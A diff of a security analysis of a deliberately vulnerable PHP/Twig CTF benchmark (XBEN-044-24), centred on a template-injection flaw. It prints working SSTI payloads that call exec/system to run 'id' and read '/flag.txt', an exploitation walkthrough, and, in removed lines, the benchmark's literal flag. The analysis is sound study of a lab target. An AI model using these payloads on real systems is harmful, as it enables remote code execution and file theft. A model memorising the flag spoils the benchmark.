@@ -1,6 +1,6 @@
 # Penetration Test Scope & Boundaries
 
-**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings reported below meet the "In-Scope" criteria defined below.
+**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings adhere to this scope and have been verified against the "In-Scope" criteria.
 
 ### In-Scope: Network-Reachable Components
 A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
@@ -21,328 +21,616 @@ A component is **out-of-scope** if it **cannot** be invoked through the running 
 
 ## 1. Executive Summary
 
-This security assessment analyzes **XBEN-044-24**, a deliberately vulnerable CTF (Capture The Flag) security challenge implemented as a PHP 8.0 web application using the Twig 1.19.0 template engine. The application exposes a single network-accessible HTTP endpoint on port 8081 that accepts user input through a POST form.
+This is a **deliberately vulnerable PHP web application** (XBEN-044-24) designed as a CTF challenge to demonstrate **Server-Side Template Injection (SSTI)** vulnerabilities in Twig 1.19.0. The application represents a critical security failure across multiple dimensions: inadequate input validation, disabled security controls, and dangerous template rendering patterns.
 
-**Critical Finding:** The application contains a **Server-Side Template Injection (SSTI)** vulnerability that enables Remote Code Execution (RCE). This vulnerability stems from the use of the deprecated `Twig_Loader_String` class combined with the intentional removal of Twig's sandbox security protections. User input sanitized with `htmlspecialchars()` is concatenated directly into a Twig template string, allowing attackers to inject Twig expression syntax (`{{ }}`) to execute arbitrary PHP code.
+The application exposes a single network-accessible endpoint (`/index.php`) that accepts user input via POST requests and renders it through the Twig template engine. Despite applying `htmlspecialchars()` for HTML escaping, the application concatenates user input directly into template strings before rendering, enabling attackers to inject Twig template expressions. The situation is further exacerbated by the deliberate removal of Twig's Sandbox security extension at runtime, eliminating all restrictions on dangerous object methods and enabling remote code execution.
 
-**Security Posture:** The application demonstrates a high-risk security posture characterized by:
-- **No authentication or authorization mechanisms** - All endpoints are publicly accessible
-- **No session management** - Completely stateless operation
-- **Disabled security controls** - Twig sandbox explicitly removed at runtime
-- **Outdated dependencies** - Twig 1.19.0 (released 2015, 9+ years old with known CVEs)
-- **No transport encryption** - HTTP-only communication on port 8080/8081
-- **Minimal input validation** - Only basic HTML escaping that doesn't prevent template injection
-- **Debug mode enabled** - Exposes internal errors and system information
-
-**Attack Surface:** The application has one primary attack vector: the `name` POST parameter on `/index.php`. This parameter feeds directly into a Twig template rendering operation vulnerable to SSTI, providing a direct path to RCE and file system access. The objective is to extract the CTF flag stored in plaintext at `/flag.txt` within the container.
-
-**Architectural Security Decision:** The codebase explicitly removes Twig's sandbox protection mechanism (lines 40-42 of `index.php`), demonstrating an intentional security weakness designed for penetration testing training. Combined with the use of `Twig_Loader_String` (which treats user input as executable template code), this creates a straightforward exploitation path from user input to system command execution.
-
----
+The attack surface is intentionally minimal but maximally exploitable. An unauthenticated attacker can achieve complete remote code execution through template injection, allowing them to read the CTF flag stored in `/flag.txt`, execute arbitrary system commands, and potentially compromise the entire container. This application serves as a textbook example of how insufficient understanding of template engines and improper security controls can lead to catastrophic vulnerabilities. The codebase is only 75 lines of application code, yet it contains multiple critical security flaws that render it completely compromised from a security standpoint.
 
 ## 2. Architecture & Technology Stack
 
 ### Framework & Language
 
-**Primary Stack:**
-- **Language:** PHP 8.0.30 (CLI, Non-Thread Safe)
-- **Build Date:** November 21, 2023
-- **Zend Engine:** v4.0.30
-- **Web Server:** Apache HTTP Server 2.4.56 (Debian)
-- **Template Engine:** Twig 1.19.0 (released July 31, 2015 - **9+ years old with known security vulnerabilities**)
+The application is built on **PHP 8.0** running on the **Apache 2.4 web server** within a Docker container. While PHP 8.0 is a relatively modern version with improved security features compared to legacy PHP versions, the application fails to leverage any of these improvements. The primary dependency is **Twig 1.19.0**, an outdated template engine released in July 2015 and now over 8 years beyond its end-of-life. This version predates numerous security patches and contains known vulnerabilities, particularly around template injection and sandbox bypass techniques.
 
-**Security Implications:**
-The application uses an ancient version of Twig (1.19.0) that predates multiple security patches and is no longer supported. This version is particularly dangerous because:
-- It includes `Twig_Loader_String`, a loader explicitly deprecated in later versions due to security risks
-- It contains known Server-Side Template Injection (SSTI) vulnerabilities (CVE-2022-39261 and related)
-- The 1.x branch is end-of-life with no security updates
-- Modern Twig versions (3.x) have significantly enhanced security controls that are absent here
+The technology stack is minimal by design: PHP 8.0 for server-side processing, Twig 1.19.0 for template rendering, and Apache 2.4 for HTTP serving. The base Docker image `php:8.0-apache` provides a standard Debian-based runtime environment. The application uses Composer for dependency management but has explicitly disabled security auditing (`composer config audit.block-insecure false`), preventing warnings about the vulnerable Twig version. The simplicity of the stack makes it easy to analyze but equally easy to exploit—there are no security layers, no web application firewalls, and no defense-in-depth mechanisms.
 
-**PHP Extensions Installed:**
-The container includes `pdo_mysql` (installed via Dockerfile line 9) but the application never uses database connectivity, representing unnecessary attack surface. The presence of cryptographic extensions (`openssl`, `sodium`) is standard but unused by the application, which implements no encryption at rest or in transit.
+From a security perspective, the combination of outdated dependencies (Twig 1.19.0), disabled security features (Sandbox extension removal), and insecure configuration (debug mode enabled, security auditing disabled) creates a perfect storm of exploitability. The application demonstrates what happens when developers prioritize functionality over security and fail to understand the security implications of template engines.
 
 ### Architectural Pattern
 
-**Application Type:** Monolithic Single-File Web Application
+The application follows a **monolithic single-file architecture** with `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php` serving as the sole entry point for all HTTP requests. This 75-line PHP file handles both GET requests (displaying the HTML form) and POST requests (processing user input and rendering results). There is no MVC framework, no routing abstraction, and no separation of concerns—all logic exists in a single procedural script.
 
-**Structural Characteristics:**
-- **Entry Point:** Single PHP file (`/var/www/html/index.php` - 75 lines)
-- **No Framework:** Raw PHP with template engine, no MVC structure
-- **No Routing:** Direct file execution, no route abstraction
-- **Stateless Design:** No session management, authentication, or state persistence
-- **Form-Based Input:** POST request handler with single `name` parameter
+The architectural simplicity reveals critical trust boundary failures. The application treats user input from `$_POST['name']` as if it were trusted data after a single call to `htmlspecialchars()`. However, `htmlspecialchars()` only escapes HTML entities (`<`, `>`, `&`, `"`, `'`) and has no effect on Twig template syntax (`{{ }}`, `{% %}`, `{# #}`). The sanitized but still dangerous input is then concatenated directly into a template string passed to `$twig->render()`, crossing the trust boundary from "user-controlled data" to "executable template code" without proper validation.
 
-**Trust Boundary Analysis:**
-The application has a **critical trust boundary violation**. The flow from untrusted user input to code execution is:
-```
-User Input (POST 'name') → htmlspecialchars() [INSUFFICIENT] → String Concatenation → Twig_Loader_String → Template Evaluation [RCE]
-```
-
-The trust boundary between "user data" and "code execution" is broken at line 56 of `index.php`, where sanitized user input is embedded into a template string that Twig interprets as executable template code. While `htmlspecialchars()` prevents HTML injection, it does not prevent template syntax (`{{`, `}}`, `{%`, `%}`) from being evaluated as Twig expressions.
-
-**Container Isolation:**
-The application runs in a Docker container with the following isolation characteristics:
-- **Base Image:** `php:8.0-apache` (Debian 11.8 Bullseye)
-- **Network:** Bridge network (`xben-044-24_default`) with port mapping 8081→8080
-- **User Separation:** Build user (`appuser:1000`) vs. runtime user (`www-data:33`)
-- **Flag Storage:** `/flag.txt` (world-readable, created during build)
+The data flow architecture is dangerously linear: **Client HTTP POST → Apache → index.php → htmlspecialchars() → String concatenation → Twig rendering → OS command execution**. Each step in this chain fails to implement defense-in-depth. The application relies on a single inadequate sanitization function and removes the one security mechanism (Twig Sandbox) that could have prevented exploitation. This represents a fundamental misunderstanding of security architecture—there are no security layers, no fail-safes, and no detection mechanisms. Trust boundaries are not just crossed; they are completely ignored.
 
 ### Critical Security Components
 
-**Input Sanitization (INADEQUATE):**
-- **Location:** `/app/index.php` line 8
-- **Method:** `htmlspecialchars($_POST['name'])`
-- **Effectiveness:** Prevents HTML/XSS but **DOES NOT** prevent Server-Side Template Injection
-- **Bypass:** Twig expression syntax (`{{`, `}}`) passes through unchanged
+The application's security posture is defined by what it lacks rather than what it implements. The most critical security component is the **Twig template engine configuration** at lines 16-24 of `index.php`. This configuration enables debug mode (`'debug' => true`), disables strict variable checking (`'strict_variables' => false`), and uses `Twig_Loader_String` to load templates from raw user-controlled strings. Debug mode exposes internal error details that aid exploitation, while the String loader is the most dangerous Twig loader because it treats arbitrary strings as executable templates rather than loading trusted templates from the filesystem.
 
-**Template Security Configuration (VULNERABLE):**
-```php
-$twig = new Twig_Environment($loader, [
-    'debug' => true,                    // ⚠️ EXPOSES internal errors
-    'charset' => 'UTF-8',
-    'base_template_class' => 'Twig_Template',
-    'auto_reload' => true,
-    'strict_variables' => false,        // ⚠️ Undefined vars don't throw errors
-    'autoescape' => 'html',             // ✓ HTML escaping enabled (but bypassed by SSTI)
-    'optimizations' => 0,               // ⚠️ No optimizations
-]);
-```
+The **Sandbox extension removal code** (lines 36-43) represents an active security failure. The Twig Sandbox extension (`Twig_Extension_Sandbox`) is designed to restrict dangerous operations within templates by enforcing a security policy that controls which tags, filters, methods, and properties can be accessed. The application explicitly checks for this extension and removes it if found, deliberately disabling the primary security mechanism that could prevent template injection attacks. This is not an oversight—it is an intentional security downgrade that enables the CTF challenge's exploitation path.
 
-**Sandbox Bypass Mechanism (CRITICAL VULNERABILITY):**
-Lines 40-42 of `/app/index.php` explicitly remove Twig's sandbox security protections:
-```php
-if ($extension instanceof Twig_Extension_Sandbox) {
-   $twig->removeExtension($extname);  // ⚠️ INTENTIONALLY DISABLES SECURITY
-}
-```
+The **input validation mechanism** at line 8 consists solely of `htmlspecialchars($_POST['name'])`, which applies HTML entity encoding but does not prevent template injection. This function is appropriate for preventing XSS when echoing user input into HTML contexts, but it is completely ineffective against SSTI because Twig syntax uses curly braces that are not escaped by `htmlspecialchars()`. The application then commits the cardinal sin of template security: concatenating this "sanitized" input directly into a template string at line 56: `$twig->render('<strong>' . $name . ' is in stock! ...</strong>')`. This pattern transforms user input into executable code, enabling attackers to inject Twig expressions like `{{7*7}}` (which renders as `49`) or more dangerous payloads like `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` (which executes the `id` system command).
 
-This code pattern demonstrates the application is designed to be vulnerable. The sandbox extension, which would normally restrict dangerous operations like calling PHP functions, is deliberately removed.
-
-**Dangerous Template Features Available:**
-- `registerUndefinedFilterCallback()` - Allows registering arbitrary PHP callables (e.g., `exec`, `system`, `passthru`) as filters
-- `getFilter()` - Can invoke registered filter callbacks with arbitrary arguments
-- `_self.env` - Direct access to Twig environment from within templates
-- Full access to PHP functions through the filter registration mechanism
-
-**Vulnerable Template Example:**
-The file `/app/templates/hello.html.twig` contains a proof-of-concept RCE payload:
-```twig
-<h4>Current user:{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}!</h4>
-```
-This demonstrates the exploitation technique:
-1. Register `exec` as a filter callback
-2. Use `getFilter("id")` to execute the `id` shell command
-3. Achieve remote code execution as the `www-data` user
-
-**Note:** This template file is not currently loaded by the main application flow (it's commented out on line 11), but serves as exploitation guidance.
-
----
+Additional security-relevant components include the **Apache configuration** at `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/wwwconf/000-default.conf` which lacks any security headers (no CSP, HSTS, X-Frame-Options, or X-Content-Type-Options), and the **Dockerfile** at `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/Dockerfile` which stores the CTF flag as plain text in `/flag.txt` (lines 30-31). The flag is passed as a Docker build argument and written to the filesystem without encryption, making it the primary target for exploitation once RCE is achieved through template injection.
 
 ## 3. Authentication & Authorization Deep Dive
 
 ### Authentication Mechanisms
 
-**Status: NOT IMPLEMENTED**
+**This application implements NO authentication system whatsoever.** There are no login endpoints, no user registration flows, no password validation, no token generation, and no session management. The application is designed as a single-purpose CTF challenge where any user can access the functionality without providing credentials.
 
-This application has **zero authentication mechanisms** of any kind. There are:
-- **No login endpoints** - No authentication flows exist
-- **No logout endpoints** - Not applicable
-- **No password handling** - No password hashing, storage, or verification
-- **No user management** - No user accounts or identity management system
-- **No JWT/token handling** - No token generation, validation, or storage
-- **No OAuth/OIDC** - No third-party authentication integration
-- **No SSO** - No single sign-on capabilities
-- **No MFA** - No multi-factor authentication
-- **No API keys** - No API authentication mechanism
+The sole network-accessible endpoint is the POST handler at lines 55-76 of `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php`. This endpoint accepts requests via both GET (displays the HTML form) and POST (processes the `name` parameter) methods without any authentication checks. The code uses a simple conditional `if ($_SERVER['REQUEST_METHOD'] === 'POST')` to distinguish between request types but performs no validation of user identity, permissions, or authorization tokens. Every visitor has identical access to the full functionality of the application.
 
-**Security Implication:** Every endpoint is publicly accessible. An external attacker requires no credentials to exploit the SSTI vulnerability and extract the flag.
+From a penetration testing perspective, the absence of authentication is both a simplification and a critical security gap. On one hand, there are no authentication bypass vulnerabilities to discover because there is nothing to bypass. On the other hand, the complete lack of access controls means that the SSTI vulnerability is immediately exploitable by any unauthenticated attacker on the internet. There is no need for credential harvesting, session hijacking, or privilege escalation—the application grants maximum access to everyone by default.
+
+**Exhaustive list of authentication endpoints:** NONE. The application has zero authentication-related endpoints.
 
 ### Session Management
 
-**Status: NOT IMPLEMENTED**
+**This application implements NO session management.** There are no calls to `session_start()`, no usage of the `$_SESSION` superglobal, no session cookie configuration, and no session storage mechanisms. Each HTTP request is processed independently with no state persistence between requests.
 
-The application has **no session management** mechanisms:
-- **No `session_start()` calls** - Sessions are never initialized (verified by code search)
-- **No `setcookie()` calls** - No cookies are set by the application
-- **No session storage** - No Redis, database, or file-based session backend
-- **No session timeout** - Not applicable
-- **No session invalidation** - Not applicable
+The absence of session management means there are no session cookies to analyze for security flags. **There is no code that configures HttpOnly, Secure, or SameSite cookie attributes** because no cookies are set by the application. The only cookies present would be those set by Apache itself (if any) or by the browser's default behavior, which are outside the application's control and not relevant to this code analysis.
 
-**Session Cookie Security Flags: NOT APPLICABLE**
-
-Since no cookies are set by the application, the following security flags are not configured:
-- **HttpOnly flag:** Not configured (no cookies exist)
-- **Secure flag:** Not configured (no cookies exist)
-- **SameSite flag:** Not configured (no cookies exist)
-
-**Code Search Evidence:**
-```bash
-# Searched application code for: session_start|session_|setcookie|cookie
-# Result: No matches found in /app/index.php
-```
-
-**Security Implication:** The application operates in a completely stateless manner. While this eliminates session-based vulnerabilities (session fixation, session hijacking), it also means there's no way to track or limit malicious activity from repeated exploitation attempts.
+From a security standpoint, the stateless design eliminates entire categories of session-based attacks (session fixation, session hijacking, CSRF via session tokens) but also eliminates any possibility of implementing authentication. The application cannot track users, maintain login state, or implement any form of access control that depends on recognizing returning visitors.
 
 ### Authorization Model
 
-**Status: NOT IMPLEMENTED**
+**This application implements NO authorization controls.** There are no role definitions (admin, user, guest), no permission checks, no access control lists (ACLs), no role-based access control (RBAC), and no attribute-based access control (ABAC). The code contains zero conditional logic that restricts functionality based on user identity or permissions.
 
-The application has **no authorization controls**:
-- **No RBAC (Role-Based Access Control)** - No role definitions exist
-- **No ABAC (Attribute-Based Access Control)** - No attribute-based policies
-- **No permission checking** - All functionality is publicly accessible
-- **No resource-level access controls** - No data access restrictions
-- **No middleware authorization** - No authorization layers
-- **No multi-tenant isolation** - Single-tenant by default (no tenant concept exists)
-
-**Access Control Model:** None - The single endpoint `/index.php` is publicly accessible without any access checks.
+Every user has identical access: they can all submit the POST form with a `name` parameter, and they all receive the same template rendering functionality. There is no concept of privilege levels, no distinction between administrators and regular users, and no resources that are restricted to specific roles. The absence of authorization controls means there are no privilege escalation vulnerabilities to exploit—everyone already has maximum privileges (which, in this case, means unrestricted access to the vulnerable template rendering endpoint).
 
 ### SSO/OAuth/OIDC Flows
 
-**Status: NOT APPLICABLE**
+**This application does NOT implement any Single Sign-On, OAuth, or OpenID Connect flows.** There are no callback endpoints for OAuth/OIDC authentication, no `state` or `nonce` parameter validation, no JWT token handling, no authorization code exchanges, and no integration with external identity providers.
 
-No OAuth, OIDC, or SSO implementation is present in the codebase.
+The application is completely self-contained with no external authentication dependencies. There are no third-party authentication libraries, no OAuth client configurations, and no SSO integrations. This eliminates entire attack vectors related to OAuth misconfigurations (missing state validation, redirect_uri manipulation, token leakage) but also means the application has zero protection against unauthorized access.
 
-### Security Assessment
+### Security Assessment Summary
 
-The complete absence of authentication and authorization creates the following security posture:
-- **Attack Complexity: LOW** - No credentials required to exploit vulnerabilities
-- **Privilege Required: NONE** - External attackers can access all functionality
-- **User Interaction: NONE** - Exploitation can be fully automated
-- **CVSS Impact:** This lack of authentication increases the severity of the SSTI vulnerability to the maximum level
-
----
+The complete absence of authentication, session management, and authorization represents a deliberate design choice for a CTF challenge, but it also means the application's critical SSTI vulnerability is immediately exploitable without any preliminary access control bypasses. An external attacker can directly interact with the vulnerable template rendering functionality at `POST /index.php` without needing to authenticate, establish a session, or escalate privileges. This dramatically reduces the attack complexity and makes the application's critical vulnerability (SSTI leading to RCE) accessible to anyone who can send an HTTP POST request to the server.
 
 ## 4. Data Security & Storage
 
 ### Database Security
 
-**Status: NO DATABASE IMPLEMENTED**
+**This application does NOT use any database system.** Despite the Dockerfile installing the `pdo_mysql` PHP extension (line 9 of `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/Dockerfile`), the application code makes no database connections. There are no calls to `mysqli_connect()`, `new PDO()`, `pg_connect()`, or any other database connection functions in `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php`. The application processes all data transiently in memory during the HTTP request lifecycle without persisting anything to a database.
 
-Despite the installation of the `pdo_mysql` PHP extension (Dockerfile line 9), the application does not use any database:
-- **No database connections** - No PDO, mysqli, or other database driver usage
-- **No SQL queries** - No query code of any kind
-- **No ORM** - No object-relational mapping framework
-- **No connection strings** - No database credentials in configuration
+The absence of database infrastructure eliminates several attack vectors: SQL injection is impossible (no SQL queries), database credential theft is irrelevant (no credentials), and database-level access control bypasses are not applicable (no database). However, this also means there is no persistent storage of application data, no audit trail of user actions, and no mechanism for data retention or analysis beyond Apache's standard access logs.
 
-**Security Implication:** While this eliminates SQL injection vulnerabilities, the presence of `pdo_mysql` represents unnecessary attack surface. If exploited via RCE, an attacker could leverage this extension to connect to external databases.
+From a penetration testing perspective, the lack of database infrastructure means the attack surface is limited to the application's code vulnerabilities (primarily SSTI) and the filesystem (where the flag is stored in `/flag.txt`). Data security concerns center entirely on the handling of the CTF flag and the processing of user input through the template engine.
 
 ### Data Flow Security
 
-**Sensitive Data Inventory:**
+The application processes a single data flow: user input from the `name` POST parameter flows through HTML escaping, template concatenation, and Twig rendering before being output to the browser. This flow contains **critical security vulnerabilities** at the template concatenation stage.
 
-The primary sensitive data in this application is the **CTF flag**, which flows through the following insecure paths:
+**Input Flow Analysis:**
 
-**Flag Storage Locations:**
-1. **`.env` file** (plaintext): `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/.env`
-   ```
-   FLAG="flag{af836647-517f-415a-a0a8-90b9bd2115e7}"
-   ```
-   
-2. **Dockerfile** (build-time injection): `/app/Dockerfile` lines 30-31
-   ```dockerfile
-   ARG FLAG 
-   RUN echo $FLAG > /flag.txt
-   ```
-   
-3. **Container filesystem** (plaintext): `/flag.txt`
-   - Created during Docker build
-   - World-readable permissions
-   - Accessible to `www-data` user (application runtime user)
-   - No encryption applied
+1. **Input Reception (Line 8):** `$name = isset($_POST['name']) ? htmlspecialchars($_POST['name']) : ' default';`
+   - User input arrives via `$_POST['name']` from the HTML form submission
+   - `htmlspecialchars()` applies HTML entity encoding, converting `<` to `&lt;`, `>` to `&gt;`, `&` to `&amp;`, and quotes to `&quot;` or `&#039;`
+   - This protects against XSS when the value is echoed into HTML, but it does NOT escape Twig syntax (`{{ }}`, `{% %}`)
 
-**Data Flow Analysis:**
-```
-.env file (plaintext) 
-    ↓
-Docker build ARG (visible in image history)
-    ↓
-RUN command execution
-    ↓
-/flag.txt written to container filesystem (plaintext)
-    ↓
-Accessible via RCE through SSTI vulnerability
-```
+2. **Template Construction (Line 56):** `echo $twig->render('<strong>' . $name . ' is in stock! ...</strong>');`
+   - The "sanitized" `$name` variable is concatenated into a string that becomes a Twig template
+   - Twig processes this string as executable template code, not as data
+   - Any Twig expressions in `$name` (like `{{7*7}}` or `{{_self.env.registerUndefinedFilterCallback("exec")}}`) are executed
 
-**Critical Security Gaps:**
-- ❌ **No encryption at rest** - Flag stored in plaintext at all stages
-- ❌ **No access controls** - Flag file readable by application user
-- ❌ **Build history exposure** - Flag visible in `docker history` output
-- ❌ **Source code exposure** - Flag hardcoded in `.env` file
-- ❌ **No encryption in transit** - HTTP-only communication (no HTTPS/TLS)
+3. **Template Execution (Twig Engine):**
+   - Twig parses the template string, identifies Twig syntax delimiters (`{{ }}`), and executes the code inside
+   - With the Sandbox extension removed (lines 36-43), there are no restrictions on what code can execute
+   - Twig's `_self.env` object provides access to the Twig Environment, which exposes dangerous methods like `registerUndefinedFilterCallback()`
 
-**User Input Data Flow:**
-```
-POST parameter 'name'
-    ↓
-htmlspecialchars() sanitization [INSUFFICIENT]
-    ↓
-String concatenation into Twig template
-    ↓
-Twig_Loader_String rendering
-    ↓
-HTML output to user
-```
+**The Vulnerability Chain:**
 
-**Cryptographic Controls: ABSENT**
+The data flow security failure occurs because the application treats template rendering as if it were simple string concatenation. The developer appears to have assumed that `htmlspecialchars()` would protect against all injection attacks, but template injection operates at a different syntactic level than HTML injection. By concatenating user input into a template string, the application transforms user data into executable code, creating a classic injection vulnerability.
 
-No cryptographic operations are performed by the application:
-- **No encryption libraries used** - No `openssl_*`, `sodium_*`, or `mcrypt_*` functions
-- **No password hashing** - Not applicable (no passwords)
-- **No token signing** - Not applicable (no tokens)
-- **No key management** - No encryption keys exist
-
-The only cryptographic function found is in the Twig framework itself (SHA-256 for template cache naming), which is not security-critical and uses the non-cryptographically-secure `mt_rand()` function for nonce generation.
+The Twig configuration exacerbates this issue:
+- **`autoescape: 'html'`** (line 22) provides HTML escaping for template variables but does NOT prevent template injection when user input controls the template structure itself
+- **`strict_variables: false`** (line 21) suppresses errors for undefined variables, making exploitation easier by preventing crashes on malformed payloads
+- **`debug: true`** (line 17) exposes detailed error messages that aid in crafting exploitation payloads
 
 ### Multi-tenant Data Isolation
 
-**Status: NOT APPLICABLE**
+**Multi-tenancy is NOT applicable** to this application. There is no concept of tenants, no tenant-specific data segregation, no row-level security filtering, and no tenant ID validation. The application is a single-purpose tool that processes individual requests independently without maintaining any multi-user data partitioning.
 
-This is a single-purpose CTF application with no multi-tenancy architecture. There are no mechanisms for:
-- Tenant identification
-- Data segregation
-- Cross-tenant access prevention
-- Shared vs. isolated schemas
+### Sensitive Data Handling: The Flag
 
----
+The most security-critical data in this application is the **CTF flag**, stored in `/flag.txt` within the Docker container. The Dockerfile explicitly creates this file during the image build process:
+
+```dockerfile
+ARG FLAG 
+RUN echo $FLAG > /flag.txt
+```
+
+**Security Issues:**
+
+1. **Plain Text Storage:** The flag is written to the filesystem as plain text without encryption or obfuscation
+2. **Build-Time Secret Exposure:** The flag is passed as a Docker build argument (`ARG FLAG`), which is visible in the image's layer history and metadata
+3. **Filesystem Access:** Any process with read access to the container's filesystem can retrieve the flag
+4. **No Access Controls:** There are no file permissions restricting access to `/flag.txt` beyond standard Linux permissions (which default to the user that created the file)
+
+The exploitation path is clear: achieve remote code execution via SSTI → execute a command like `cat /flag.txt` → retrieve the flag value. The template injection vulnerability in `index.php` provides exactly this capability, making the flag trivially accessible once SSTI is exploited.
+
+### Data Protection Mechanisms
+
+The application implements **minimal data protection**:
+
+- **HTML Entity Encoding:** `htmlspecialchars()` protects against XSS but not SSTI
+- **Twig Autoescape:** Configured for HTML context but bypassed by template injection
+- **No Encryption:** No data encryption at rest or in transit (HTTP on port 8080, not HTTPS)
+- **No Data Validation:** No schema validation, type checking, or input format restrictions beyond `htmlspecialchars()`
+- **No Rate Limiting:** No protection against brute force or DoS attacks
+- **No CSRF Protection:** No CSRF tokens in the POST form (though the lack of authentication makes CSRF less relevant)
+
+The data security posture is fundamentally compromised by the SSTI vulnerability, which allows attackers to bypass all data protection mechanisms and achieve arbitrary code execution.
 
 ## 5. Attack Surface Analysis
 
-### External Entry Points (Network-Accessible)
+### External Entry Points
 
-**Total Network Entry Points: 1**
+The application exposes a **single primary network-accessible entry point**: the `/index.php` endpoint served by Apache on port 8080. This endpoint handles both GET and POST requests, providing the complete functionality of the application.
 
-#### Entry Point #1: Main Application Form Handler
+#### Entry Point #1: POST /index.php (Primary Attack Vector)
 
-**Network Details:**
-- **File Path:** `/app/index.php`
-- **Route Pattern:** `/index.php` (DocumentRoot default handler)
-- **HTTP Methods:** `GET`, `POST`
-- **External URL:** `http://localhost:8081/index.php`
-- **Internal URL:** `http://127.0.0.1:8080/index.php` (container)
-- **Authentication:** None - Publicly accessible
-- **Authorization:** None required
+**Location:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php` (lines 55-76)
+
+**HTTP Methods:** GET (displays form), POST (processes input)
+
+**Parameters:**
+- `name` (POST parameter) - User-supplied string that is rendered through Twig template engine
+
+**Authentication Required:** NO - Publicly accessible without credentials
 
 **Functionality:**
-This endpoint serves two purposes:
-1. **GET requests** (lines 60-75): Displays an HTML form with a single text input field for "article name/model"
-2. **POST requests** (lines 55-58): Processes the `name` parameter and renders it through Twig template engine
+- GET request: Returns an HTML form with a text input field and submit button
+- POST request: Processes the `name` parameter through Twig template rendering and displays the result
 
-**Input Parameters:**
-- **Parameter Name:** `name` (POST)
-- **Source:** HTML form field (line 69)
-- **Data Type:** String (any content accepted)
-- **Validation:** Only `isset()` check and `htmlspecialchars()` encoding
-- **Sanitization:** `htmlspecialchars()` applied on line 8 (INSUFFICIENT for template injection)
-- **Length Limits:** None enforced
-- **Character Restrictions:** None enforced
+**Security Implications:**
 
-**Code Flow:**
+This endpoint is the **critical attack surface** for this application. The POST request handler accepts user input via the `name` parameter, applies inadequate sanitization (`htmlspecialchars()`), and then commits a catastrophic security error by concatenating this input into a Twig template string:
+
 ```php
-// Line 8: Input sanitization
+echo $twig->render('<strong>' . $name . ' is in stock! Come back and test another one. </strong>');
+```
+
+This pattern enables **Server-Side Template Injection (SSTI)**, allowing attackers to inject Twig expressions that execute with the privileges of the web server process. The vulnerability is exacerbated by the removal of the Twig Sandbox extension, which eliminates all security restrictions on template operations.
+
+**Exploitation Path:**
+
+1. Attacker crafts a malicious payload: `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag.txt")}}`
+2. Attacker submits this payload via POST to `/index.php` with parameter `name=<payload>`
+3. The application applies `htmlspecialchars()`, which does not escape `{` or `}` characters
+4. The payload is concatenated into the template string
+5. Twig parses and executes the template, registering `system()` as a filter callback
+6. The filter is invoked with `cat /flag.txt`, executing the shell command
+7. The command output (the flag) is rendered in the HTTP response
+
+**Additional Context:**
+
+The endpoint also renders diagnostic information that aids exploitation:
+- Twig version is displayed: `Twig version: 1.19.0`
+- Loaded extensions are listed: `Loaded extension: core, escaper, optimizer`
+- This information confirms that the Sandbox extension has been removed and helps attackers craft version-specific exploits
+
+#### Entry Point #2: Static File Access (Apache DocumentRoot)
+
+**Location:** Apache DocumentRoot configured at `/var/www/html`
+
+**Configuration File:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/wwwconf/000-default.conf` (line 12)
+
+**Security Implications:**
+
+Apache is configured to serve files from `/var/www/html`, which is the application's deployment directory. This means that any file in this directory is potentially accessible via HTTP if Apache's default behavior allows it. In the current configuration:
+
+- `/index.php` is the primary entry point and is intentionally accessible
+- `/composer.json` may be accessible, exposing dependency information (though this is not highly sensitive)
+- `/templates/hello.html.twig` may be accessible as a static file if directly requested (though Apache typically doesn't serve `.twig` files directly)
+
+The more significant risk is that if the application achieves RCE via SSTI, an attacker could potentially write new files to `/var/www/html` (if permissions allow) and access them via HTTP, establishing a more persistent foothold. However, the primary attack vector remains the SSTI vulnerability in `/index.php`.
+
+### Internal Service Communication
+
+**This application has NO internal service communication.** It is a single monolithic PHP application with no microservices architecture, no inter-service API calls, no message queues, and no distributed components. All processing occurs within a single PHP process handling a single HTTP request.
+
+There are no trust relationships between services to analyze, no service-to-service authentication to evaluate, and no network segmentation boundaries to consider. The attack surface is entirely external-facing through the Apache web server on port 8080.
+
+### Input Validation Patterns
+
+The application implements a **single, inadequate input validation mechanism**: `htmlspecialchars()` applied to the `name` POST parameter at line 8 of `index.php`.
+
+**Validation Implementation:**
+
+```php
+$name = isset($_POST['name']) ? htmlspecialchars($_POST['name']) : ' default';
+```
+
+**What This Does:**
+- Checks if `$_POST['name']` is set; if not, defaults to `' default'`
+- Applies `htmlspecialchars()` with default parameters (converts HTML special characters to entities)
+- Default encoding is UTF-8 (PHP 5.4+)
+- Default quote style is ENT_COMPAT (encodes double quotes but not single quotes)
+- Converts: `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`, `"` → `&quot;`
+
+**What This Does NOT Do:**
+- Does not escape Twig syntax delimiters: `{`, `}`, `%`
+- Does not validate input format, length, or allowed characters
+- Does not implement any whitelist or blacklist filtering
+- Does not prevent template injection attacks
+- Does not apply any context-specific escaping for template engines
+
+**Why This Fails:**
+
+Template injection operates at a different syntactic level than HTML injection. While `htmlspecialchars()` prevents XSS by encoding HTML metacharacters, it has no effect on template syntax. An attacker can submit a payload like `{{7*7}}`, which passes through `htmlspecialchars()` unchanged (because `{`, `}`, and `*` are not HTML special characters) and is then executed as Twig code when the template is rendered.
+
+**Absence of Validation:**
+
+The application lacks:
+- **Length validation:** No maximum length restriction on the `name` parameter
+- **Character whitelisting:** No restriction to alphanumeric characters or safe character sets
+- **Format validation:** No regex patterns or schema validation
+- **Content-Type validation:** No verification that the request Content-Type matches expectations
+- **Rate limiting:** No throttling of repeated requests
